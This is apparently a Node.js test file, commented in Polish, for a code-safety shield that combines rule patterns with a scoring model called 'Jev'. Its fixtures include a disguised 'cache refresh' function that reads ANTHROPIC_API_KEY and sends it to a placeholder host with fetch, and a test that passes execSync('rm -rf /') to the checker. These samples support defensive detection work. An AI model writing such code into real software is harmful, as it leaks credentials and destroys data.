// 🛡️ Tarcza Prawdy z drugim głosem Jev (Suweren 2026-10-08: „zrób Tarczę Prawdy na Jev”).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import AlignmentShield from '../services/AlignmentShield.js';

const tarcza = AlignmentShield.getInstance();
const jevMowi = (odp) => ({ stan: () => ({ maKlucz: true }), zapytaj: async (z) => { jevMowi.ostatnie = z; return { model: 'jev-1.13.0', answers: Object.fromEntries(Object.entries(odp).map(([k, p]) => [k, { type: 'noul', noul: p }])) }; } });
const CZYSTY = '// Liczy sumę koszyka\nexport function suma(ceny) {\n  return ceny.reduce((a, b) => a + b, 0);\n}\n';
const PODSTEPNY = '// odświeża pamięć podręczną\nexport async function odswiez() {\n  const k = process.env.ANTHROPIC_API_KEY;\n  await fetch("https://przyklad.test/x?d=" + k);\n}\n';

test('bez klucza: inspectZJev = karta reguł (jev: null), wynik jak inspect()', async () => {
    tarcza.jev = { stan: () => ({ maKlucz: false }) };
    const k = await tarcza.inspectZJev(CZYSTY, { targetFile: 'a.ts' });
    assert.equal(k.jev, null);
    assert.equal(k.score, tarcza.inspect(CZYSTY, { targetFile: 'a.ts' }).score);
    tarcza.jev = null;
});

test('Jev widzi wyciek, którego reguły nie łapią — p ≥ 0,85 blokuje', async () => {
    const reguly = tarcza.inspect(PODSTEPNY, { targetFile: 'cache.ts' });
    assert.equal(reguly.blocked, false, 'żaden wzór reguł tego nie łapie');
    tarcza.jev = jevMowi({ szkoda: 0.3, wyciek: 0.93, ukrycie: 0.88, atrapa: 0.1 });
    try {
        const k = await tarcza.inspectZJev(PODSTEPNY, { targetFile: 'cache.ts' });
        assert.equal(k.blocked, true);
        assert.match(k.summary, /ZABLOKOWANO/);
        assert.ok(k.findings.some((f) => f.severity === 'CRITICAL' && /wyprowadzać dane/.test(f.what) && /p=0\.93/.test(f.what)));
        assert.ok(k.findings.some((f) => f.pillar === 'DECEPTION' && /ukrywa/.test(f.what)));
        assert.deepEqual(k.jev, { model: 'jev-1.13.0', glos: { szkoda: 0.3, wyciek: 0.93, ukrycie: 0.88, atrapa: 0.1 } });
        assert.deepEqual(Object.keys(jevMowi.ostatnie.questions), ['szkoda', 'wyciek', 'ukrycie', 'atrapa']);
        assert.equal(jevMowi.ostatnie.state.plik, 'cache.ts');
    } finally { tarcza.jev = null; }
});

test('średnie p (0,6–0,85) = ostrzeżenie z karą, nie blokada; atrapa nigdy nie blokuje', async () => {
    tarcza.jev = jevMowi({ szkoda: 0.7, wyciek: 0.1, ukrycie: 0.2, atrapa: 0.99 });
    try {
        const k = await tarcza.inspectZJev(CZYSTY, { targetFile: 'a.ts' });
        assert.equal(k.blocked, false);
        assert.ok(k.findings.some((f) => f.severity === 'HIGH' && /szkodzić/.test(f.what)));
        assert.ok(k.findings.some((f) => f.pillar === 'FABRICATION' && /atrapa/.test(f.what)));
        assert.ok(k.score < tarcza.inspect(CZYSTY, {}).score);
        assert.match(k.summary, /ostrzeżeniami/);
    } finally { tarcza.jev = null; }
});

test('czysty kod i niski głos Jev — bez znalezisk; reguły nadal blokują same (rm -rf)', async () => {
    tarcza.jev = jevMowi({ szkoda: 0.02, wyciek: 0.01, ukrycie: 0.03, atrapa: 0.05 });
    try {
        const k = await tarcza.inspectZJev(CZYSTY, { targetFile: 'a.ts' });
        assert.equal(k.findings.length, 0);
        assert.match(k.summary, /Czysto/);
        const r = await tarcza.inspectZJev('import { execSync } from "child_process";\nexecSync("rm -rf /");\n', {});
        assert.equal(r.blocked, true, 'reguła rm -rf blokuje niezależnie od Jev');
    } finally { tarcza.jev = null; }
});

test('Jev padł — karta reguł + jevBlad (zapis decyduje jak dawniej)', async () => {
    tarcza.jev = { stan: () => ({ maKlucz: true }), zapytaj: async () => { throw new Error('Jev HTTP 529'); } };
    try {
        const k = await tarcza.inspectZJev(PODSTEPNY, {});
        assert.equal(k.blocked, false);
        assert.match(k.jevBlad, /529/);
    } finally { tarcza.jev = null; }
});
